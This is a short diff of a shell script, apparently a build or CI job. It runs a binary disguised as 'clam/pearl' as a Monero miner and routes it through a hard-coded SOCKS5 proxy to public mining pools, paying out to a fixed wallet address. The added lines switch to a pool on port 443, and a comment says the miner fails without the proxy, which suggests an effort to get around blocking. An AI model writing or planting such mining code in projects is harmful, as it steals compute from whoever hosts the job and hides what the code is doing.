@@ -13,7 +13,10 @@ curl --socks5 199.116.112.6:4145 ipinfo.io
 
 # does not work wothout proxy
 echo "Running pearl"
-timeout 360 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+#timeout 360 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+timeout 60 clam/pearl -x 199.116.112.6:4145 -o pool.hashvault.pro:443 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+
+
 exit 0
 #curl 18.196.88.146:14433
 #ping -c 1 xmr-eu1.nanopool.org
